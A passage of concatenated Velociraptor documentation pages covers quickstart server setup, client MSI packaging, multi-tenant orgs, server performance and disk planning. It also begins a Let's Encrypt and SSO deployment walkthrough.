./velociraptor --help-long | more
```

You can also see the help for a specific command by adding `-h` after the
command.

In the next step we are going to use the `config generate` command.

## Step 2: Create the server configuration file

Central to every Velociraptor deployment is a
[YAML](https://www.tutorialspoint.com/yaml/yaml_basics.htm)
[configuration file]({{< ref "/docs/deployment/references/" >}}).
This file contains all the configuration parameters that define how your server
and clients operate, plus cryptographic material that is used to secure
several aspects of the deployment, such a client-server communications.

To generate a new configuration file we use the `config generate` command. The
`-i` flag tells it to run in interactive mode, which means it will launch a
question/answer dialogue-style "wizard" that will gather the most important
details needed to produce your config.

{{< tabs >}}
{{% tab name="Linux" %}}
```shell
./velociraptor config generate -i
```
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor.exe config generate -i
```
{{% /tab %}}
{{% tab name="macOS" %}}
```shell
./velociraptor config generate -i
```
{{% /tab %}}
{{< /tabs >}}

![Generating a configuration for a self-signed deployment](self-signed-generation.gif)

In the configuration wizard you should choose the options described below. For
all other questions you should accept the default values.

- **Deployment Type**: `Self Signed SSL`
- **What is the public DNS name of the Master Frontend?**: Here you should
  enter the IP server address (or DNS name if you created one) that clients will
  use to connect to the server.

On the 4th screen of the config wizard you will be asked to add Admin users.

```text
 Adding Admin User Number 0
 Enter an empty username or Ctrl-C to stop

┃ Username
┃ > admin

┃ Password
┃ > <your_password>
```

This user account will be used for initial access to the admin user interface.

You don't need to add more than one admin user as additional users (admin or
non-admin) can be added after installation. It is common to only have 1 admin
user and many non-admin users, with the latter being used for day-to-day DFIR
work. So after adding one user you can enter a blank username and password which
will allow you to continue.

The final step of the config wizard will offer to write the config file to your
working directory.

- **Name of file to write**: `server.config.yaml`

You can accept the default file name and the wizard will then exit.

As you saw, the configuration wizard guides you through the key decisions and
provides sensible defaults for most options. Ultimately it produces a YAML
configuration file that contains settings that both the Velociraptor server and
clients will use. The configuration wizard is the recommended way to generate a
new configuration, although it is common to manually tweak some settings in this
configuration file, as we will do next.

By default the configuration binds the GUI and Frontend services to only the
loopback interface, `127.0.0.1`. We will need to change this in the
configuration file to make these service accessible to other network hosts.

Open the configuration file in a text editor and change:

```yaml
Frontend:
  bind_address: 127.0.0.1
```

to:

```yaml
Frontend:
  bind_address: 0.0.0.0
```

If you need to access the GUI from a different network host then also change:

```yaml
GUI:
  bind_address: 127.0.0.1
```

to:

```yaml
GUI:
  bind_address: 0.0.0.0
```

In Self-signed SSL mode, which only supports Basic authentication, you should
avoid exposing the GUI to untrusted networks (i.e. the public internet). If your
server needs to be accessible from the internet then you should leave the
`GUI.bind_address` set to the loopback interface and use
[SSH Local Port Forwarding](https://iximiuz.com/en/posts/ssh-tunnels/)
which can be secured by stronger authentication mechanisms.

Because the configuration file is a key component to your deployment and
contains security-sensitive material you should always keep it secure and
ideally also keep an backup of it in a secure location. The server configuration
does not change unless you edit it, so remember to update your backup copy
whenever you make any changes.

The server installation package that we will create in the next step also
contains a copy of the server config, so you should handle it with the same
security considerations as the config file itself.

## Step 3: Create the server installation package

The server component will be installed and run as a service on your Linux
machine. In addition to installing the Velociraptor binary and configuration file, the
installation also creates a service account (named `velociraptor`) and
service configuration so that it can run as a service. The installation package
takes care of these setup tasks, and we generate it using a single command.

As mentioned previously, the Velociraptor binary provides several utility
functions on the command line. One of these is the ability to generate Linux
installation packages, specifically `deb` packages for Debian-based systems and
`rpm` packages for RPM-based systems.

To create the server installation package, run the appropriate command below in
your working directory.

**Debian-based server:**

```sh
./velociraptor debian server --config ./server.config.yaml
```

or

**RPM-based server:**

```sh
./velociraptor rpm server --config ./server.config.yaml
```

The output file will be automatically named to include the version and
architecture, but you can choose any file name you want and specify it with the
`--output <your_file_name>` flag.

If you did not perform the previous steps on your server then you will need to
copy the server installation file to your server.

## Step 4: Install the server component

Install the server package using the command below according to your server's
packaging system.

**Debian-based server installation:**

```
$ sudo dpkg -i velociraptor_server_0.74.1_amd64.deb
Selecting previously unselected package velociraptor-server.
(Reading database ... 527396 files and directories currently installed.)
Preparing to unpack velociraptor_server_0.74.1_amd64.deb ...
Unpacking velociraptor-server (0.74.1) ...
Setting up velociraptor-server (0.74.1) ...
Created symlink /etc/systemd/system/multi-user.target.wants/velociraptor_server.service → /etc/systemd/system/velociraptor_server.service.
```

or

**RPM-based server installation:**

```
$ sudo rpm -Uvh velociraptor-server-0.74.1.x86_64.rpm
Verifying...                          ################################# [100%]
Preparing...                          ################################# [100%]
Updating / installing...
   1:velociraptor-server-0:0.74.1-A   ################################# [100%]
Created symlink '/etc/systemd/system/multi-user.target.wants/velociraptor_server.service' → '/etc/systemd/system/velociraptor_server.service'.
```

Now that the service is installed we can check its status in a few ways.

**Check the service status:**

```
$ systemctl status velociraptor_server.service
● velociraptor_server.service - Velociraptor server
     Loaded: loaded (/etc/systemd/system/velociraptor_server.service; enabled; vendor preset: enabled)
     Active: active (running) since Tue 2025-04-08 12:25:34 SAST; 3min 5s ago
   Main PID: 3514 (velociraptor.bi)
      Tasks: 19 (limit: 4537)
     Memory: 67.2M
        CPU: 4.249s
     CGroup: /system.slice/velociraptor_server.service
             ├─3514 /usr/local/bin/velociraptor.bin --config /etc/velociraptor/server.config.yaml frontend
             └─3522 /usr/local/bin/velociraptor.bin --config /etc/velociraptor/server.config.yaml frontend

Apr 08 12:25:34 linux64-client systemd[1]: Started Velociraptor server.
```

**Check that the GUI is listening:**

```sh
$ nc -vz 127.0.0.1 8889
Connection to 127.0.0.1 8889 port [tcp/*] succeeded!
```

**Check that the Frontend is listening:**

```sh
$ nc -vz 127.0.0.1 8000
Connection to 127.0.0.1 8000 port [tcp/*] succeeded!
```

## Step 5: Log in to the Admin GUI

The Admin GUI should now be accessible with a web browser by connecting to
`https://127.0.0.1:8889`, or using your server's IP address if you changed the
`GUI.bind_address` setting in Step 2.

Log in using the admin account that you created in the config wizard. You will
arrive at the Welcome screen.

![Welcome to Velociraptor!](welcome.png)

You can learn more about the Admin GUI [here]({{< ref "/docs/gui/" >}}). Our
next goal is to create an installation package for our Windows endpoints.

## Step 6: Create an installation package for Windows clients

Velociraptor clients are available for many operating systems and architectures,
and the subject of packaging and installing clients is covered in more detail in
the section [Deploying Clients]({{< ref "/docs/deployment/clients/" >}}).

The most important thing to know is that all Velociraptor clients need a client
configuration, which is specific to the deployment. This configuration is a
subset of the full YAML-based configuration. Because the server has access to
the full configuration it is able to provide the client configuration to us when
needed
[in the form of a YAML file]({{< ref "/docs/deployment/clients/#option-1-obtaining-the-client-config-from-the-gui" >}}).
The server can also use it internally, for example when generating a client
installation package (for Windows clients), as we will show in this guide.

![Client config is a subset of the full config](client_config_yaml.svg)

The most commonly deployed client by far is 64-bit Windows. The standard
installer package format for Windows in enterprise environments is still the MSI
format.

We publish a prebuilt MSI package on our GitHub Release page, however since the
Velociraptor client requires *your* unique configuration file which is linked to
*your* server, we don't package a working configuration file in the official
release MSI. The official MSI contains a placeholder configuration file. You
will need to modify the official release MSI to include your client
configuration file, and this is easily done through a process we call
"repacking". We have a streamlined process for generating a custom MSI package
which can be done entirely in the Admin GUI. This is the quickest and easiest
way to generate the MSI package, and so it's the one we will use here.

1. In the Velociraptor web GUI select **Server Artifacts** from the sidebar on
   the left side of the page.

![](server_artifacts.png)

![](create_msi_add.svg)

2. Add a new collection: search for `Server.Utils.CreateMSI`, select it, and
   then click "Launch".

![](create_msi_artifact.png)

3. It will take a moment to download the latest release MSI files (64-bit and
   optionally 32-bit) from GitHub and then repack them with your client config
   file.

4. The repacked MSI files will then be available in the **Uploaded Files** tab
   of the artifact collection.

![](create_msi_uploaded.svg)

Download the MSI files. You will then need to copy them to a network share, USB
stick or other medium that allows you to access them from your Windows
endpoints. In this simplified scenario we will only be installing the client
manually. For full-scale deployments the MSI is typically rolled out through
enterprise application management tools.

## Step 7: Install the client on endpoints

On your Windows endpoints, installation is done by running the MSI that you
created in the previous step.

The MSI installs the client as a Windows service, so it requires elevated
privileges and you may be prompted with the familiar UAC prompt to allow the
installation to continue.

After installation you will have the client running as the "Velociraptor
Service" which you can see in the Services app.

![Velociraptor client service](velociraptor_windows_service.png)

Returning to your Velociraptor server, you can find the newly enrolled client by
clicking the <i class="fas fa-search"></i> button in the "Search clients" bar at
the top of the page.

![Your first client](your_first_client.png)

## What's next?

After installing your first client, here are the next steps you may want to
consider:

- [Learn about managing clients]({{< ref "/docs/clients/" >}})
- [Create non-Windows client installers]({{< ref "/docs/deployment/clients/" >}})
- [Explore additional security configuration options]({{< ref "/docs/deployment/security/" >}})
- [Consider creating Orgs]({{< ref "/docs/deployment/orgs/" >}}) for managing
  distinct sets of clients.
- [Plan for a more durable and secure installation]({{< ref "/docs/deployment/server/" >}})

---END OF FILE---

======
FILE: /content/docs/deployment/orgs/_index.md
======
---
menutitle: Organizations
title: Organizations and Multi-tenancy
last_reviewed: 2025-02-24
draft: false
weight: 20
summary: |
  Velociraptor supports multiple orgs in a full multi-tenancy configuration.
---

Velociraptor supports multiple orgs in a full multi-tenancy
configuration. Orgs are lightweight and can be added and removed
easily with minimal impact on resource requirements.

This is useful in a number of scenarios:

1. You are a service provider with many customers of varying size
   networks. Multi-Tenancy configuration allows you to onboard a
   smaller customer (with e.g. less than 1000 endpoints) onto the same
   infrastructure without needing to deploy additional resources.

2. You have multiple organizational units within your own company with
   different access control requirements. For example, some units
   require much more controlled access and different set of
   Velociraptor users.

In Velociraptor, multi-tenancy is implemented by dividing the clients into
separate **Organizations** or **Orgs**.

Each org is logically completely separate from other orgs:

* Each org contains a different set of clients. A Client is configured
  to access an org by way of a shared secret in its configuration file
  ([`Client.nonce`]({{% ref "/docs/deployment/references/#Client.nonce" %}})).
  It is not possible for a client to connect to a different org
  without knowing this shared secret.
* Storage for each Org is separated within the data-store directory in
  an org specific sub-directory. This means you can backup, restore or
  delete orgs very easily since the data is separate.
* Users have access control lists (ACLs) within the respective
  Org. This means that the same user can have different roles and
  permissions in different orgs. Orgs can have their own administrator
  user who can perform administrative actions on the org without
  affecting other orgs.
* Custom artifacts can be maintained in different Orgs. Users within
  an org can independently create and update custom artifacts without
  affecting other orgs.
* VQL running in notebooks or server artifacts will automatically and
  transparently use the correct org without affecting or being able to
  access other orgs.
* Orgs can be created and destroyed easily at runtime (via VQL).

### The Root org

While Velociraptor allows creating multiple orgs it is not mandatory!
By default when Velociraptor is first installed, the `root` org is
created and all clients connect to it.

If you choose not to create additional Organizations then you can just
continue using the `root` org as normal for all your clients.

Additional orgs are created as Child orgs of the root org. In a
multi-tenancy deployment the root org has additional privileges that
other orgs do not have:

1. A user with the `Org Administrator` permission within the `Root`
   Org is allowed to manage orgs (e.g. create new Orgs or delete
   Orgs). The `Org Administrator` permission is meaningless within a
   non-root org.

2. Custom artifacts from the root org are automatically visible in all
   child orgs. This supports the use case of multi-tenancy as the root
   org can manage a custom set of artifacts for their tenants.

###  Switching to different orgs

You can switch to any other orgs your user account has access to using the
user preferences tile in the GUI.

![Selecting Org](selecting_orgs.svg)

Normally in order to see an org in the drop down selector, your
Velociraptor user account needs at least `Reader` level access to that
org.

If your user has the role `Org Administrator` on the `root` org, then you can
see all orgs in listings for the purpose of administering them (for example
adding users), but in order to switch to an org your user _also_ has to have at
least the `Reader` role in that org..

### Creating a new Org

{{% notice tip "Orgs are always managed from the Root org" %}}

Since the `Org Administrator` permission is only meaningful for the
root org you should ensure that you are in the root org in the GUI before
creating or deleting orgs. Attempting to create or delete orgs from a non-root
org will always fail.

{{% /notice %}}

You can use the `Server.Orgs.NewOrg` server artifact to create a new org

![Creating a new Org](new_org_1.svg)

![Specifying parameters for new Org](new_org_2.png)

As a convenience this artifact also allows you to select other server artifacts
that will be run in the new org after it is created. Typically you would want to
create a MSI installer for Windows clients, so this is selected by default.
However you may also create the MSI at a later time (for example after a version
upgrade) using the procedure [described below]({{< relref "#creating-client-installer-packages" >}})

As you can see, the `Server.Orgs.NewOrg` artifact is just running VQL to create
the new org. You could alternatively run the same VQL in a global notebook or in
a "bootstrap" artifact when setting up new servers.

#### Assigning users to the new org

Once the new org is created you can assign users to the Org using the
[Adding a New User]({{% ref
"/docs/deployment/security/#adding-a-new-user" %}}) procedure.

### Preparing client deployment for the new Org

Clients are configured to connect to one org only. While the
cryptographic keys (e.g. The internal CA Certificate) of clients from
all Orgs are the same, the [`Client.nonce`]({{% ref
"/docs/deployment/references/#Client.nonce" %}}) is different for each
Org. The server uses this nonce to associate the client with the correct
Org. The nonce is included in the client's configuration file and acts
as a shared secret between all the Org clients and the server.

#### Creating client installer packages

To create an installation package that connects to the new Org, you
need to [build an MSI]({{% ref "/docs/deployment/clients/#official-release-msi" %}})
within the target Org:

1. First switch to the relevant Org with the GUI selector
2. Launch the server artifact `Server.Utils.CreateMSI` within the context of the target Org.

The produced MSI will connect to the target Org.

For non-Windows platforms you will currently need to build the
installation packages manually with the Org specific client config
file, as explained in
[Deploying Clients]({{< ref "https://docs.velociraptor.app/docs/deployment/clients/#linux" >}}).
You can download the correct org-specific configuration file
from the main dashboard as show below.

![Downloading the Org Specific Configuration File](downloading_org_config.svg)


### Auditing User Actions

As described in the [Auditing User actions]({{% ref
"/docs/deployment/security/#auditing-user-actions" %}}) section,
Velociraptor collects auditable events into a central location for
review by the administrators.

When running within an Org context, each Org collects its own audit
log (although you can still forward all logs to a remote syslog
server). This allows an administrator within the Org to only view
relevant auditable events to that Org. It is also possible to install
server monitoring artifacts to automate actions based on auditable
events within the org.

---END OF FILE---

======
FILE: /content/docs/deployment/references/_index.md
======
---
title: Configuration file Reference
menutitle: Config Reference
no_children: true
weight: 120
pre: <i class="fas fa-book"></i>
summary: |
  This is an annotated server.config.yaml with complete explanations for all
  options currently available.
---

{{< include-html "_reference.html" >}}

---END OF FILE---

======
FILE: /content/docs/deployment/resources/_index.md
======
---
title: Performance
weight: 50
summary: |
  In this page we discuss some of the performance limitations of the platform.
  It is important to understand how performance affects the framework and how
  Velociraptor manages finite resources to scale up efficiently.
---

With the present architecture, Velociraptor only supports a file based
data store. This makes it easy to deploy as you don't need to set up
an elaborate database backend, but this is inherently limited to a
single machine.

We expect this limitation to be removed in the near future but until
then, people are often asking us about how to spec the server and how
many endpoints Velociraptor can support in its current form.

In this page we discuss some of the performance limitations of the
platform. It is important to understand how performance affects the
framework and how Velociraptor manages finite resources to scale up
efficiently.

The following discussion is fairly technical and goes into a lot of
specific implementation details.

## Idle performance

One of the important considerations is how many resources are used by
an idle deployment - i.e. one at which clients are simply connected to
the server but no active hunts or collections are run from them. It is
important to note that even when clients are idle, Velociraptor always
collects endpoint footprint telemetry by sampling Velociraptor's own
CPU and Memory footprint every 10 seconds on each endpoint.

We typically deploy on AWS a `t2.large` (8Gb 2 core VM) to support up
to 10k endpoints. Below is a deployment we have that is mostly idle.
CPU load is in the range 10-20% of one core, memory < 400mb when
idle. This is a typical medium sized deployment of around 2.5k
endpoints. Load typically increases linearly - so a 5,000 endpoint
deployment might use twice the CPU load etc. For 20,000 endpoint
deployment a larger size VM would be required.

![Idle performance statistics](idle.png)

When idle, the main CPU load is with RSA operations for encrypting and
decrypting messages to the endpoint. Since each endpoint selects an
ephemeral key we need to maintain an in-memory cache of session keys -
this avoids having to do a lot of RSA operations. The size of the
cache is controlled by the `Frontend.expected_clients` setting and
defaults to 10,000 endpoints. Increasing endpoints above that will
overflow the memory cache and will results in a lot more RSA
operations. The cache can be increased safely at the cost of added
memory use.

## Heavy hunting

When running many hunts, the server simply collects results from the
endpoints. Due to the unique architecture of Velociraptor, all
collections are simply queries that run on the endpoints. Queries can
return a result set (essentially rows and columns of JSON encoded
values), or bulk data (e.g. for file uploads). The server simply
stores these results in the filestore.

For this reason even hunts that intuitively seem expensive are
actually very light on the server. For example, consider an artifact
that applies a Yara signature to many files on the endpoints. This
might search through many Terabytes of data collectively on all
endpoints, but if the signature is good will only report few relevant
results. In this case the load will be very small on the server
(client side load can be managed through the op/sec client side query
limiting mechanism).

On the other hand, consider a hunt that just collects a lot of data
(e.g. the `Windows.KapeFiles.Targets` artifact). This causes the
clients to send a lot of bulk data which the server needs to decrypt,
then store on the filesystem. This will lead to a lot of server load
(and will also saturate inbound bandwidth). It is easy to collect
hundreds of Gigabytes unintentionally at scale.

### Managing concurrency

When receiving a lot of data from many clients simultaneously, the
Velociraptor frontend must buffer the data in memory before decrypting
and processing the data. Therefore the limiting factor is actually
memory and not CPU load. The total number of concurrent connections
determines the total memory used.

To protect itself, the frontend has a limit on the total number of
concurrent client connections. This is controlled by the
`Frontend.concurrency` setting. The default is 6 but if you have more
than 2Gb of RAM you should probably increase that to 20 or more.

The concurrency setting limits the number of clients that are allowed
to upload data to the server at the same time. Lowering this value
reduces memory use, but increases the time taken for hunts to
complete. Many hunts are not terribly urgent so this is a reasonable
trade off.

In the current version (0.4.1) there is no QoS mechanism on the
communications so while a heavy hunt is in progress, interactive
investigation (e.g. through the VFS view) can not proceed. Therefore
currently this is a disadvantage of lowering concurrency too much. We
expect the situation to change in the near future.

Typically hunts progress very quickly and do not transfer a lot of
data (Collecting large quantities of data not only leads to server
saturation, but also leaves the investigators with huge quantity of
data to post process - it is better to be more surgical in collection
and move processing to the query on the endpoints as much as possible).

The figure below shows a typical day of heavy hunting on the
deployment shown in the previous figure (about 2.5k endpoints). Each
of the CPU spikes is a hunt, and most hunts complete in a few
minutes. During the hunt CPU load rises to about 160-180% (this is a 2
core VM), but memory remains very stable due to the concurrency
controls described above.

![Hunting performance](hunting.png)


### Disk space

By far the most important aspects of specing the server is the amount
of disk space available. Since Velociraptor uses a simple filesystem
to store all its data, it is easy to manage disk space by deleting or
archiving old data.

{{% notice note "Disk usage" %}}

 It is very easy to fill up disk space with Velociraptor because it is
 so fast and responsive. For example issuing a large triage file
 collection for user's web browser related files might include on
 average 500Mb of Internet cache files per client - on a 10,000 machine
 deployment this will collect 5tb of data! Since Velociraptor is very
 fast, if you have excellent connectivity to your endpoints, you
 **will** fill up the disk in a matter of hours!

 Always be aware of the multiplicative effect of scale. In many cases
 it might require a change of mindset - if you are most familiar with
 interactive "traditional" digital forensics it might require
 re-thinking your approach when scaling up investigations and issuing
 more surgical artifact collections.

 If your disk fills, The Velociraptor frontend will be unable to
 receive any data from endpoints (will begin serving 500
 responses). Due to Velociraptor's architecture, clients will queue up
 outgoing messages to the server in their local buffer file (by
 default up to 1Gb).

 This might result in a situation where after clearing the disk space,
 Velociraptor will immediately fill it up again with more data queued
 to be sent by the clients. If this happens you need to stop active
 hunts to actively remove their results from clients' buffer files.

{{% /notice %}}

The following describes the directories one typically finds in the
filestore directory:

1. `acl` : This contains the ACL policies for all users.
2. `artifact_definitions`: This contains custom artifacts that were added through the GUI

3. `client_index` and `clients`: These contains information collected
   from all clients. It is possible to completely remove these
   directories and restart the server. Clients will simply re-enrol
   automatically.

4. `config`: This directory contains server specific configuration
   that is changed through the GUI.

5. `downloads`: Contains Zip files prepared via the GUI's "Prepare Download" button.

6. `hunt_index` and `hunt`: contain metadata related to managing
   current hunts. It does not typically contain a lot of data.

7. `notebooks` contains the user created post processing and analysis
   notebooks. You probably do not want to remove these.

8. `server_artifacts` store the results of collection Server Artifacts
   in the GUI.

9. `users` contains information about all GUI users.


The majority of the disk usage appears in the `clients` directory so
it is worth aggressively managing that usage.


In the AWS cloud it is possible to resize disk space dynamically. See [Requesting Modifications to Your EBS Volumes
](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/requesting-ebs-volume-modifications.html) and [Extending a Linux File System After Resizing a Volume](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/recognize-expanded-volume-linux.html). You can do this without even restarting the server.

---END OF FILE---

======
FILE: /content/docs/deployment/server/_index.md
======
---
menutitle: Server Deployment
title: Server Deployment
draft: false
weight: 10
date: 2025-02-27
last reviewed: 2025-04-27
summary: "How to plan and implement your server deployment"
---

In our [Quickstart Guide]({{< ref "/docs/deployment/quickstart/" >}}) we cover the process
for performing a simplified deployment, secured with Self-signed SSL
certificates and Basic authentication. This type of deployment is most suited to
short-term uses such as training environments, temporary on-site incident
response situations, and small deployments with no internet exposure. As
suggested by the term "Quickstart", the goal there is to get a working
deployment up and running as quickly as possible, while assuming that the
operating environment will provide sufficient security for the expected duration
of the deployment.

For longer-term deployments it is essential to plan your installation taking
into consideration all the
[security mechanisms]({{< ref "/docs/deployment/security/" >}})
that Velociraptor offers, such as using publicly verifiable SSL certificates
(Velociraptor supports automatic enrollment and renewal of free certificates
from Let's Encrypt). Using proper SSL certificates allows the Velociraptor
server to be further secured using SSO authentication, and also eliminates the
"bad certificate" browser warning seen when using the self-signed certificates.

## What's next?

{{% children "description"=true %}}


---END OF FILE---

======
FILE: /content/docs/deployment/server/deployment_example/_index.md
======
---
menutitle: Deployment Example
title: Deployment Example
draft: false
weight: 30
date: 2025-02-27
last reviewed: 2025-04-27
aliases:
  - "/docs/deployment/cloud/"
summary: |
  In this example we will walk through the process of deploying the server using
  Let's Encrypt certificates, and optionally an SSO authentication provider.
---

In this example we will walk through the process of deploying the server using
Let's Encrypt certificates, and optionally an SSO authentication provider.

This is a common deployment choice for long-term deployments (both cloud-hosted
and on-premises), or for scenarios where a cloud-based server is required (and
where clients will connect to the server via the internet).

Most enterprise systems require an SSO mechanism to manage user accounts and
passwords, one reason being that manual user account management simply does not
scale. The choice of authentication provider is usually determined by each
organizations existing Identity and Access Management (IAM) policies and
infrastructure.

Velociraptor supports the most popular SSO providers and protocols. These
providers can be a cloud-based IDPs or on-premises IDM solutions.


## Before You Begin

Note the following requirements:
- You must use a DNS name as Let's Encrypt will not issue a certificate for an
  IP address. The DNS name can be managed via Dynamic DNS.
- Ports 80 and 443 must be publicly accessible. Let's Encrypt uses both ports to
  issue certificates.
- You can optionally configure Authentication via one or more SSO providers.

#### Provision a Virtual Machine

Next we provision a Linux VM from any cloud provider. The size of your VM
depends on the number of endpoints in your environment. A standard VM with 8 or
16Gb RAM should be sufficient for around 5-10k clients. Additionally you will
need sufficient disk space to hold the data you collect. We recommend starting
with a modest amount of storage and then periodically back up and purge old
data, or else increase the storage volume size as needed.

Ubuntu is commonly used for production Velociraptor deployments and we use it
for testing, so it is generally recommended unless you have a strong preference
for something else. If you choose to use another Linux distro then please note
that it needs to be one that uses systemd, although most do these days.

{{% notice info "Network filtering requirements" %}}

The virtual machine must be able to receive connections over *both* ports 80 and
443. Be sure to check inbound filtering Access Control Lists to ensure that
access is allowed. When using SSL, both the client communication and the Admin
GUI are served over the same port to benefit from SSL transport encryption. The
Let's Encrypt protocol requires Let's Encrypt's servers to connect to the VM on
port 80 for the purpose of certificate issuance and renewal, however
Velociraptor will only provide services on the SSL-secured port 443.

If you forgot to open port 80, Let's Encrypt will fail to issue the
certificate and repeated failures might result in them
[blocking the domain name](https://letsencrypt.org/docs/rate-limits/#authorization-failures-per-hostname-per-account)
from getting an SSL certificate for several days. If you find that this has
happened and you can't afford to wait, then you will need to change to a new
DNS name and start again.

Several Velociraptor features do require outbound access from the server to GitHub,
although [it is possible]({{< ref "/artifact_references/pages/server.utils.uploadtools/" >}})
for the server to operate without any internet access.

{{% /notice %}}


#### Get a DNS name for your server

An SSL certificate says that the DNS name is owned by the server that presents
it. You will need a public DNS name ("A" record) pointing to your Velociraptor
server’s external IP. This is because:

- Let's Encrypt will only issues a certificate for a public DNS name
- DNS names are integral to SSO and therefore required.


#### Assign an IP address

You can assign your Virtual Machine a static IP address or a dynamic IP address.
If you use a dynamic IP address for your server then you must also configure
Dynamic DNS.

Velociraptor natively supports updating
[Cloudflare](https://www.cloudflare.com/learning/dns/glossary/dynamic-dns/) or
[No-IP](https://www.noip.com/) Dynamic DNS, so these are the easiest options to
use since they require no external DDNS update mechanism. For other DDNS
providers, you can install an external Dynamic DNS client such as
[ddclient](https://ddclient.net/) to update your DNS->IP mapping.

After the dynamic address is created, you need to note the credentials (as
configured with your DDNS provider) for updating the IP address, as you will
need to supply these during Velociraptor's interactive configuration process.


## Prepare the server installation package

Before installing anything we need to prepare by creating the Velociraptor
config, and then package that config into a deb or rpm installer package which
we will then install on the Velociraptor server.

These pre-installation steps can be done on any platform.

### 1. Generate the configuration file

Central to every Velociraptor deployment is a
[YAML](https://www.tutorialspoint.com/yaml/yaml_basics.htm)
[configuration file]({{< ref "/docs/deployment/references/" >}}).
This file contains all the configuration parameters that define how your server
and clients operate, plus cryptographic material that is used to secure
several aspects of the deployment, such a client-server communications.

To generate a new configuration file we use the `config generate` command. The
`-i` flag tells it to run in interactive mode, which means it will launch a
question/answer dialogue-style "wizard" that will gather the most important
details needed to produce your config.

{{< tabs >}}
{{% tab name="Linux" %}}
```shell
./velociraptor config generate -i
```
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor.exe config generate -i
```
{{% /tab %}}
{{% tab name="macOS" %}}
```shell
./velociraptor config generate -i
```
{{% /tab %}}
{{< /tabs >}}

{{% notice tip %}}

The aim of the wizard is to make it easy to configure Velociraptor in the most
common deployment scenarios. Even though these scenarios will not be a perfect
fit for everyone, most users should be able to start with these deployment modes
and tweak the configuration to their specific needs.

The end result of running the configuration wizard is a YAML configuration file.
So there is no harm in doing "dry runs" and examining or comparing resulting
files to better understand how the choices affect the resulting configuration.

{{% /notice %}}

#### Deployment Type

On the first screen of the configuration wizard you will be asked to select the
Deployment Type.

```text
$ ./velociraptor config generate -i
 Welcome to the Velociraptor configuration generator

 This wizard creates a configuration file for a new deployment.

 Let's begin by configuring the server itself.

┃ Deployment Type
┃ This wizard can create the following distinct deployment types.
┃    Self Signed SSL
┃  ● Automatically provision certificates with Lets Encrypt
┃    Authenticate users with SSO
```

* If you don't intend to use SSO, or intend to configure it manually later, then
  choose **Automatically provision certificates with Lets Encrypt**. \
  _This deployment option will enable Basic authentication instead of SSO._
* If you do want to use SSO then choose the option **Authenticate users with
  SSO**. \
  _This deployment option also configures the deployment to use Let's Encrypt certificates._

For either of the above choices the resulting config will specify that
Velociraptor's Frontend (which clients connect to) and GUI listen on port 443,
secured by TLS. The certificates will, in both cases, be automatically issued
via Let's Encrypt.

> Self-signed SSL with Basic authentication is most often used when Velociraptor
> is deployed on private networks for temporary situations such as incident
> response. For long-term deployments, the other modes of operation that
> Velociraptor offers should be preferred. We describe the process of deploying
> in this mode in our [Quickstart Guide]({{< ref "/docs/deployment/quickstart/" >}}).
> Self-signed mode is incompatible with SSO authentication.

Also on the first page you will be asked:

* **What OS will the server be deployed on?** This choice will affect the
  defaults for various options, mainly path specifications which would be
  different on Windows. Velociraptor is typically deployed on a Linux
  machine, although the configuration can be generated on Windows or macOS.

#### Server configuration

The next few questions on the seconds page of the config wizard relate to the
configuration of the server itself:

* **Path to the datastore directory**: Velociraptor uses flat files for all
  storage. This path is where Velociraptor will write it's files. You should
  mount any network filesystems or storage devices on this path.

* **Path to the logs directory**: The default value is usually acceptable.

* **Internal PKI Certificate Expiration**: This internal certificate is
  generated and stored in the configuration file. This option _does not_ affect
  the Let's Encrypt certificates, which are issued and automatically renewed at
  least every 90 days. You may choose to override the default 1-year certificate
  expiry if you intend to deploy a long-term server instance.

For the next 2 questions you should probably accept the defaults, unless you're
really sure that you want to change these and understand the impacts. Remember
that you can change any option at a later time by manually editing the config
file.

* **Do you want to restrict VQL functionality on the server?**

* **Use registry for client writeback?**

#### Network configuration

On the third page of the config wizard you will be asked for network-related
information for your deployment:

* **The public DNS name of the Frontend?**: The clients will connect to the
  server using this DNS name.

* **DNS Type**: As mentioned previously, if your server has a dynamic IP address
  then you need to have set up DDNS updating for the server's DNS name. We
  support Cloudflare and NOIP DDNS providers internally, and if you choose one
  of these options you will be asked to supply DDNS update credentials. If you
  are using an external update mechanisms such as dd client, then choose "None -
  Configure DNS manually".

* **Would you like to try the new experimental websocket comms?**: We recommend
  this option, especially for large deployments since it provides more efficient
  client-server communications. However, as the question note advises, you
  should test that this traffic is not blocked/restricted in your environment
  before choosing this option.

#### Authentication configuration

If you initially chose **Authenticate users with SSO** then you can skip the
next section and go to [SSO authentication](#configure-sso-authentication).

##### Configure Basic Authentication

If you initially chose **Automatically provision certificates with Lets Encrypt**
then on the 4th screen of the config wizard you will be asked to add Admin users.

The initial set of administrator accounts specified here will be stored in the
configuration file. When Velociraptor starts, it automatically creates these
accounts as administrators in the datastore, so that you can access the Admin
GUI.

You typically don't need to add more than one admin user as additional users
(admin or non-admin) can be added after installation. It is common to only have
1 admin user and many non-admin users, with the latter being used for day-to-day
DFIR work. So after adding one user you can enter a blank username and password
which will allow you to continue.

```text
 Adding Admin User Number 0
 Enter an empty username or Ctrl-C to stop

┃ Username
┃ > admin

┃ Password
┃ > <your_password>
```

Since you chose to use only Basic authentication you can [skip](#config-wizard-finish)
the next step which applies to SSO configuration.

##### Configure SSO Authentication

If you initially chose **Authenticate users with SSO** then the 4th screen of
the config wizard will ask you to choose your SSO provider and the subsequent
screen will ask for details which may vary depending on your choice of provider.

Since this step also requires that you set up SSO at your provider, we refer you
to the following Knowledge Base articles which explain the provider-specific
steps for an OAuth2 provider and an OIDC provider:

* [How to set up authentication using Google OAuth SSO]({{< ref "/knowledge_base/tips/setup_google_oauth/" >}})
* [How to set up OIDC authentication using Keycloak]({{< ref "/knowledge_base/tips/setup_keycloak/" >}})

The config wizard only presents the most commonly-used providers and options,
but we support several others as explained
[here]({{< ref "/docs/deployment/server/key_concepts/#authentication-providers" >}}).
It is even possible to add [multiple authentication providers]({{< ref "/knowledge_base/tips/multiple_oauth/" >}}).

Once you have completed the SSO configuration you can proceed to the final
step in the configuration wizard...

##### Config Wizard Finish

The final step of the config wizard will offer to write the config file to your
working directory.

- **Name of file to write**: `server.config.yaml`

You can accept the default file name and the wizard will then exit.

### 2. Make any further changes to the config file

At this point you may want to review the generated config file and make any
adjustments that you deem necessary.

For example, by default the configuration wizard binds the GUI to only the
